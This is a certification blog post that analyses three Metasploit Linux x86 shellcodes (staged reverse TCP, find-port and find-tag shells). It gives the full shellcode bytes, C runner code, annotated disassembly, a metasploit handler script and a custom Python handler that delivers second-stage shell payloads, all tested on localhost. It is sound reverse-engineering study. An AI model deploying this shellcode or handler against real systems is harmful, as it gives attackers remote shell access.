---
layout: single
title: SLAE Assignment 5 - MsfVenom Shellcodes Analysis
date: 2020-5-09
classes: wide
header:
  teaser: /assets/images/slae/SHELLCODING32.png
tags:
    - Shellcoding
    - Linux
    - x86
    - SLAE
    - Metasploit
---

![](/assets/images/slae/SHELLCODING32.png)

## Introduction
This is the fifth post of the SLAE exam assignments serie.  

The goal of this assignement is to dissect and present an analysis of at least three msfvenom shellcodes. 

All the source code for this assignment can be found on my [github repository](https://github.com/skr0x/SLAE/tree/master/Assignment-05-MsfVenom_shellcodes_analysis)

## Staged payload analysis

In this assignment, I set the goal for myself to study how a staged payload is implemented and how to handle it manually.

So the payloads I've chosen are :

	- linux/x86/shell/reverse_tcp
	- linux/x86/shell_find_port
	- linux/x86/shell_find_tag

### linux/x86/shell/reverse_tcp

To begin, we need to generate the payload and we will set it to connect to the loopback address on port 1337 :
```plaintext
root@kali:~# msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of c file: 543 bytes
unsigned char buf[] = 
"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89"
"\xe1\xcd\x80\x97\x5b\x68\x7f\x00\x00\x01\x68\x02\x00\x05\x39"
"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0"
"\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9"
"\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd"
"\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80"
"\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
"\x00\xcd\x80";
```
Then we insert it in this c code :
```c
#include<stdio.h>
#include<string.h>

unsigned char payload[] = \
"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89"
"\xe1\xcd\x80\x97\x5b\x68\x7f\x00\x00\x01\x68\x02\x00\x05\x39"
"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0"
"\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9"
"\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd"
"\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80"
"\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
"\x00\xcd\x80";

int main()
{

	printf("Payload Length:  %d\n", strlen(payload));

	int (*ret)() = (int(*)())payload;

	ret();

}
```
We compile it and run it with gdb :
```plaintext
root@kali:~# gcc -fno-stack-protector -z execstack shellcode.c -o staged-reverse-tcp
root@kali:~# gdb ./staged-reverse-tcp
```
Now my analysis of the first stage payload and the gdb commands I've used to see its assembly code :
```nasm
(gdb) set disassembly-flavor intel 
(gdb) break *&payload
(gdb) run
(gdb) disas

   ; Init ESI like a loop counter to retry to connect if an error occurs
=> 0x00404040 <+0>:	push   0xa
   0x00404042 <+2>:	pop    esi		      ; set ESI to 10

   ; socketcall(SYS_SOCKET, *socketargs)
   ; socket(AF_INET, SOCK_STREAM, 0)
   ; return sockfd in EAX and store it in EDI
   0x00404043 <+3>:	xor    ebx,ebx
   0x00404045 <+5>:	mul    ebx		      ; set EAX,EBX,EDX to 0

   0x00404047 <+7>:	push   ebx		      ; push Null Pointer
   0x00404048 <+8>:	inc    ebx		      ; Set EBX to 1
						      ; used to push SOCK_STREAM value
						      ; and for SYS_SOCKET socketcall type
   0x00404049 <+9>:	push   ebx                    ; SOCK_STREAM
   0x0040404a <+10>:	push   0x2 		      ; AF_INET
   0x0040404c <+12>:	mov    al,0x66	              ; set eax to socketcall value
   0x0040404e <+14>:	mov    ecx,esp		      ; Point ECX to socket() arguments
   0x00404050 <+16>:	int    0x80
   0x00404052 <+18>:	xchg   edi,eax		      ; Save sockfd in EDI

   ; socketcall(SYS_CONNECT, *connectargs)
   ; connect(sockfd, *sockaddr, addrlen)
   ; sockaddr{AF_INET, port, ip_address}
   0x00404053 <+19>:	pop    ebx		      ; set ebx to 2 (SYS_BIND socketcall type)
   0x00404054 <+20>:	push   0x100007f	      ; push chosen IP address (127.0.0.1)
   0x00404059 <+25>:	push   0x39050002	      ; push chosen port (1337) and AF_INET
   0x0040405e <+30>:	mov    ecx,esp                ; set ECX to *sockaddr 
   0x00404060 <+32>:	push   0x66			
   0x00404062 <+34>:	pop    eax		      ; set eax to socketcall value
   0x00404063 <+35>:	push   eax		      ; push 0x66 for addrlen
   0x00404064 <+36>:	push   ecx		      ; push *sockaddr
   0x00404065 <+37>:	push   edi		      ; push sockfd
   0x00404066 <+38>:	mov    ecx,esp		      ; Point ECX to connect() arguments
   0x00404068 <+40>:	inc    ebx		      ; set EBX to SYS_CONNECT
   0x00404069 <+41>:	int    0x80		      
 
   0x0040406b <+43>:	test   eax,eax		      ; EAX AND EAX operation, update the signed flag (SF)
						      ; here it is used to test if an error occured
						      ; it is also equivalent and faster than "cmp eax, 0"
   0x0040406d <+45>:	jns    0x404088 <payload+72>  ; jump if SF = 0 (if the connection succeeds)

   0x0040406f <+47>:	dec    esi		      ; if the shellcode can't connect
						      ; decrement the ESI counter
   0x00404070 <+48>:	je     0x4040af <payload+111> ; if ESI = 0, jump to exit syscall

   ; man nanosleep
   ; int nanosleep(const struct timespec *req, struct timespec *rem);
   ; Here suspends the execution for the time specified in *req 
   ; before retrying to connect
   0x00404072 <+50>:	push   0xa2		      
   0x00404077 <+55>:	pop    eax                    ; nanosleep syscall number
   0x00404078 <+56>:	push   0x0                    ; 0 nanoseconds
   0x0040407a <+58>:	push   0x5                    ; 5 seconds
   0x0040407c <+60>:	mov    ebx,esp                ; struct timespec pointer
   0x0040407e <+62>:	xor    ecx,ecx                ; Null pointer
   0x00404080 <+64>:	int    0x80

   0x00404082 <+66>:	test   eax,eax                ; test if an error occured
   0x00404084 <+68>:	jns    0x404043 <payload+3>   ; if no error, retry to connect
   0x00404086 <+70>:	jmp    0x4040af <payload+111> ; else jump to exit syscall

   ; man mprotect 
   ; int mprotect(void *addr, size_t len, int prot);
   ; used to set the access protection of the page to which 
   ; belongs the memory address of the top of the stack to RWX
   ; return 0 on success
   0x00404088 <+72>:	mov    dl,0x7		      ; set EDX to Read Write Exec permission value
   0x0040408a <+74>:	mov    ecx,0x1000             ; set ECX to memory page length
   0x0040408f <+79>:	mov    ebx,esp                ; copy stack address to EBX

   0x00404091 <+81>:	shr    ebx,0xc                ; Page alignment, set the last 12bits of EBX to 0
   0x00404094 <+84>:	shl    ebx,0xc		      ; EBX now point to the first byte of the page to which
						      ; belongs the memory address of the top of the stack
   0x00404097 <+87>:	mov    al,0x7d                ; mprotect syscall number
   0x00404099 <+89>:	int    0x80

   0x0040409b <+91>:	test   eax,eax                ; test if an error occured
   0x0040409d <+93>:	js     0x4040af <payload+111> ; On error jump to exit syscall

   ; man read
   ; ssize_t read(int fd, void *buf, size_t count);
   ; Used to read count bytes from fd into the buffer pointed by *buf
   ; It will read from sockfd the second stage payload and copy it 
   ; at the memory address of the top of the stack
   0x0040409f <+95>:	pop    ebx		      ; EBX set to 5 
						      ; last push at 0x0040407a
   0x004040a0 <+96>:	mov    ecx,esp		      ; ECX point to the top of the stack
   0x004040a2 <+98>:	cdq                           ; set EDX to 0
   0x004040a3 <+99>:	mov    dh,0xc                 ; count (EDX) set to 3072
   0x004040a5 <+101>:	mov    al,0x3		      ; read syscall number
   0x004040a7 <+103>:	int    0x80

   0x004040a9 <+105>:	test   eax,eax                ; test if an error occured
   0x004040ab <+107>:	js     0x4040af <payload+111> ; On error jump to exit syscall

   0x004040ad <+109>:	jmp    ecx		      ; else jump to ECX 
						      ; that point to the second stage payload code

   ; exit(1)
   0x004040af <+111>:	mov    eax,0x1                ; exit syscall number
   0x004040b4 <+116>:	mov    ebx,0x1                ; exit return value
   0x004040b9 <+121>:	int    0x80
```
Then using the following metasploit script, we launch msfconsole to handle it before continuing in gdb :
```plaintext
root@kali:~# cat staged-reverse.rc 
use exploit/multi/handler
set payload linux/x86/shell/reverse_tcp
set lhost 127.0.0.1
set lport 1337
exploit -j -z

msfconsole -r staged-reverse.rc
```

And finally we come back to analyse the second stage payload :
```nasm
(gdb) break *0x004040ad			//   0x004040ad <+109>:	jmp    ecx
(gdb) continue
(gdb) x/19i $ecx


   0xbffff284:	mov    ebx,edi        ; set EBX to sockfd
				      ; Remember it was saved in EDI in the first stage	
	
   0xbffff286:	push   0x2   
   0xbffff288:	pop    ecx	      ; ECX set to 2

   ; dup2 loop to overwrite stdin/stdout/stderr with sockfd
   0xbffff289:	push   0x3f           
   0xbffff28b:	pop    eax	      ; dup2 syscall number
   0xbffff28c:	int    0x80

   0xbffff28e:	dec    ecx            ; decrement ECX
   0xbffff28f:	jns    0xbffff289     ; jump to next dup2 if ECX >= 0 

   ; execve("/bin//sh", ["/bin//sh"], null)
   0xbffff291:	push   0xb	      
   0xbffff293:	pop    eax            ; execve syscall number
   0xbffff294:	cdq                   ; set EDX to 0
   0xbffff295:	push   edx	      ; push string terminator
   0xbffff296:	push   0x68732f2f     ; //sh	
   0xbffff29b:	push   0x6e69622f     ; /bin    
   0xbffff2a0:	mov    ebx,esp        ; EBX point to /bin//sh

   0xbffff2a2:	push   edx            ; push null
   0xbffff2a3:	push   ebx            ; push string address
   0xbffff2a4:	mov    ecx,esp	      ; ECX point to ["/bin//sh", null]
   0xbffff2a6:	int    0x80	      
```

So we have seen that the linux/x86/shell/reverse_tcp payload implements some sort of errors handling on each syscall, exiting properly if an error occurs.
Its normal operation is as follow, it try up to ten times to connect to the specified ip address and port.  
On success, it set read, write, execute permission on the memory page whose belongs the memory address of the top of the stack, 
then it read the second stage payload from the remote host and copy it into memory starting at the stack top address.
Finally it jump to the second stage payload to execute it, here, the payload send by metasploit retrieve the sockfd because it know in which register it is saved, then it use a dup2(sockfd,...) loop/execve("/bin//sh") payload.


### linux/x86/shell_find_port

Its description in msfvenom is :  Spawn a shell on an established connection
So it need to be used in a context where there is already an opened connection to our host,
to reuse this connection and spawn a shell on it. 
It made me think of a second stage payload, it's why I've chosen it. 

So in a first time, we need to generate it and we will set the port to find to 1337 :
```plaintext
root@kali:~# msfvenom -p linux/x86/shell_find_port cport=1337 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 62 bytes
Final size of c file: 287 bytes
unsigned char buf[] = 
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"
"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x05\x39\x75\xf1\x5b"
"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80";
```

Then we copy/paste it into this C code :
```c
#include<stdio.h>
#include<string.h>

unsigned char payload[] = \
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"
"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x05\x39\x75\xf1\x5b"
"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80";

int main()
{

	printf("Payload Length:  %d\n", strlen(payload));

	int (*ret)() = (int(*)())payload;

	ret();

}
```

We compile it and run it with gdb :
```plaintext
root@kali:~# gcc -fno-stack-protector -z execstack shellcode.c -o shell-find-port
root@kali:~# gdb ./shell-find-port 
```

And we break at the start of the payload and look at its instructions :
*Note that it will crash if we run it, it's just to see the instructions.*
```nasm
(gdb) set disassembly-flavor intel 
(gdb) break *&payload
(gdb) run
(gdb) disas

   ; socketcall(SYS_GETPEERNAME, *getpeername_args)
   ; getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
   ; 
   ; getpeername will write to *addr the information about the peer connected to sockfd if it is a valid file descriptor
=> 0x00404040 <+0>:	xor    ebx,ebx                    ; set EBX to 0
   0x00404042 <+2>:	push   ebx			  ; push 0

   0x00404043 <+3>:	mov    edi,esp			  ; EDI will point to the memory address 
							  ; before the getpeername arguments

   0x00404045 <+5>:	push   0x10			  ; push the struct sockaddr length
   0x00404047 <+7>:	push   esp                        ; push *addrlen 
   0x00404048 <+8>:	push   edi                        ; push *addr 
   0x00404049 <+9>:	push   ebx                        ; push 0 for sockfd 
   0x0040404a <+10>:	mov    ecx,esp                    ; set ECX point to getpeername arguments
   0x0040404c <+12>:	mov    bl,0x7			  ; SYS_GETPEERNAME type

   ; Start of getpeername loop used to find the file descriptor of the connection to reuse 
   0x0040404e <+14>:	inc    DWORD PTR [ecx]            ; increment sockfd value 
   0x00404050 <+16>:	push   0x66
   0x00404052 <+18>:	pop    eax			  ; EAX set to socketcall number
   0x00404053 <+19>:	int    0x80                       ; execute socketcall

   0x00404055 <+21>:	cmp    WORD PTR [edi+0x2],0x3905  ; compare sockaddr.sin_port with 1337
   0x0040405b <+27>:	jne    0x40404e <payload+14>      ; if not equal, go to the next iteration of the getpeername loop   

   ; Connection found !
   ; Initializing and starting dup2 loop to overwrite stdin/out/err with sockfd
   0x0040405d <+29>:	pop    ebx			  ; EBX set to sockfd
   0x0040405e <+30>:	push   0x2                        
   0x00404060 <+32>:	pop    ecx			  ; ECX set to 2
   0x00404061 <+33>:	mov    al,0x3f                    ; dup2 syscall number
   0x00404063 <+35>:	int    0x80

   0x00404065 <+37>:	dec    ecx			  ; decrement ECX
   0x00404066 <+38>:	jns    0x404061 <payload+33>      ; jump if ECX >= 0

   ; Standard execve("/bin//sh", ["/bin/sh", null], null)
   0x00404068 <+40>:	push   eax			  ; string terminator, because dup2(sockfd, 0) return 0 on success
   0x00404069 <+41>:	push   0x68732f2f		  
   0x0040406e <+46>:	push   0x6e69622f                 ; "/bin//sh"
   0x00404073 <+51>:	mov    ebx,esp                    ; EBX point to "/bin//sh"
   0x00404075 <+53>:	push   eax                        ; null pointer
   0x00404076 <+54>:	push   ebx                        ; push pointer "/bin//sh"
   0x00404077 <+55>:	mov    ecx,esp                    ; ECX points to argv tab
   0x00404079 <+57>:	cdq                               ; set EDX to 0, null pointer 
   0x0040407a <+58>:	mov    al,0xb                     ; execve syscall
   0x0040407c <+60>:	int    0x80
```

We can see that this payload can retrieve a specific opened connection by using a loop to use the getpeername syscall with all possible value for a file descriptor without looking if the syscall is successfull, until it find the sockfd that is connected to a peer on the specified port. 
Then it overwrite stdin/stdout/stderr with the sockfd and pop a shell on the connection.

Now we will see a second payload that can be used like a second stage payload, this time, using a tag to find a specific opened connection.

### linux/x86/shell_find_tag

I've chosen this one for the same reason as the previous one, and because it implements a different technique.

So in a first time, we need to generate it and we will set the tag to find to SLAE :
```plaintext
root@kali:~# msfvenom -p linux/x86/shell_find_tag TAG=SLAE -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 69 bytes
Final size of c file: 315 bytes
unsigned char buf[] = 
"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86"
"\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x53\x4c\x41\x45"
"\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79"
"\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
```
Like always, we copy/paste it into this C code :
```c
#include<stdio.h>
#include<string.h>

unsigned char payload[] = \
"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86"
"\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x53\x4c\x41\x45"
"\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79"
"\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

int main()
{

	printf("Payload Length:  %d\n", strlen(payload));

	int (*ret)() = (int(*)())payload;

	ret();

}
```

We compile it and run it with gdb :
```plaintext
root@kali:~# gcc -fno-stack-protector -z execstack shellcode.c -o shell-find-tag
root@kali:~# gdb ./shell-find-tag 
```

Then we break at the start of the payload and look at its instructions :
```nasm
(gdb) set disassembly-flavor intel 
(gdb) break *&payload
(gdb) run
(gdb) disas

   ; socketcall(SYS_RECV, *recv_arguments)
   ; recv(int sockfd, void *buf, size_t len, int flags)
   ; used to receive message from the socket sockfd, and place it in the buffer *buf of length len 
=> 0x00404040 <+0>:	xor    ebx,ebx                    ; EBX set to 0
   0x00404042 <+2>:	push   ebx			  ; push 0

   0x00404043 <+3>:	mov    esi,esp                    ; ESI will point to the memory address 
							  ; before the arguments of recv
 
   0x00404045 <+5>:	push   0x40                       ; push flag MSG_DONTWAIT /* Nonblocking IO.  */
							  ; From man recv "if the operation would block, the call fails"
   0x00404047 <+7>:	mov    bh,0xa			  
   0x00404049 <+9>:	push   ebx                        ; push len argument => 0xa00 bytes
   0x0040404a <+10>:	push   esi                        ; push pointer to the buffer
   0x0040404b <+11>:	push   ebx                        ; push sockfd argument
   0x0040404c <+12>:	mov    ecx,esp                    ; ECX point to the arguments of recv
   0x0040404e <+14>:	xchg   bl,bh                      ; SYS_RECV (EBX = 0xa)

   ; Start of recv loop used to find the file descriptor of the connection to reuse  
   0x00404050 <+16>:	inc    WORD PTR [ecx]             ; increment sockfd to try to recv from the next file descriptor
   0x00404053 <+19>:	push   0x66
   0x00404055 <+21>:	pop    eax		          ; socketcall number
   0x00404056 <+22>:	int    0x80                       ; execute socketcall

   0x00404058 <+24>:	cmp    DWORD PTR [esi],0x45414c53 ; compare the value pointed by ESI (recv *buf) with our tag SLAE 
   0x0040405e <+30>:	jne    0x404050 <payload+16>      ; if not equal, go to the next iteration of the recv loop

   ; Connection found !
   0x00404060 <+32>:	pop    edi			  ; Save the good sockfd in EDI  

   ; dup2 loop and execve(/bin//sh) below
   ; I will not comment it, if you don't understand the instructions
   ; I invite you to look the previous payloads analysis and/or the previous posts of this serie 
   0x00404061 <+33>:	mov    ebx,edi                  
   0x00404063 <+35>:	push   0x2
   0x00404065 <+37>:	pop    ecx
   0x00404066 <+38>:	push   0x3f
   0x00404068 <+40>:	pop    eax
   0x00404069 <+41>:	int    0x80
   0x0040406b <+43>:	dec    ecx
   0x0040406c <+44>:	jns    0x404066 <payload+38>
   0x0040406e <+46>:	push   0xb
   0x00404070 <+48>:	pop    eax
   0x00404071 <+49>:	cdq    
   0x00404072 <+50>:	push   edx
   0x00404073 <+51>:	push   0x68732f2f
   0x00404078 <+56>:	push   0x6e69622f
   0x0040407d <+61>:	mov    ebx,esp
   0x0040407f <+63>:	push   edx
   0x00404080 <+64>:	push   ebx
   0x00404081 <+65>:	mov    ecx,esp
   0x00404083 <+67>:	int    0x80
```

So we can see that this payload is very similar to the previous one, it use almost the same loop to run through all possible file descriptor numbers and to overwrite the standard I/O and pop a shell with execve syscall.
The only difference is that it use the recv syscall to try to read datas from the file descriptor then to compare them with the specified tag.

## Manualy handling staged payloads 

Finally to learn how to handle staged payload manualy I've done the following Python script,
It was much simpler than what I was thinking before starting this assignement :
```python
#!/usr/bin/python3

import socket
import time
import argparse

find_port = b"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x05\x39\x75\xf1\x5b\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

find_tag = b"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x53\x4c\x41\x45\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
tag = b"SLAE"

parser = argparse.ArgumentParser()
parser.add_argument("type", choices=["port","tag"], help="Find specific port or tag")
args = parser.parse_args()

if args.type == "port": 
    payload = find_port
else :
    payload = find_tag


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

ip = "127.0.0.1"
port = 1337
sock.bind((ip, port))

sock.listen(1)
print("[x] Started reverse handler on {}:{}".format(ip, port))

conn, address = sock.accept()
print("[x] Connection established from {}".format(address[0]))

print("[x] Sending second stage ({} bytes) to {}".format(len(payload),address[0]))
conn.send(payload)
time.sleep(1)

if args.type == "tag":
    print("[x] Sending tag '{}'".format(tag.decode()))
    conn.send(tag)

while True:
    cmd = input("# ")
    conn.send(cmd.encode() + b"\n")

    if cmd == "exit":
        conn.close()
        sock.close()
        break

    rep = conn.recv(1024);
    print(rep.decode(), end="")
```

And I've used the linux/x86/shell/reverse_tcp binary from the first analysis.
Here is an example with the shell_find_tag payload :

In the first terminal prompt 
```plaintext
root@kali:~# ./staged-handler.py tag
[x] Started reverse handler on 127.0.0.1:1337
[x] Connection established from 127.0.0.1
[x] Sending second stage (69 bytes) to 127.0.0.1
[x] Sending tag 'SLAE'
# id
uid=0(root) gid=0(root) groups=0(root)
```

And in the second, (we can note an error on the payload size because it contains null bytes)
```plaintext
root@kali:~# ./staged-reverse-tcp 
Payload Length:  22
```

And... This is the end, thank you if you have read so far :)

***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
Student ID: PA-14186***
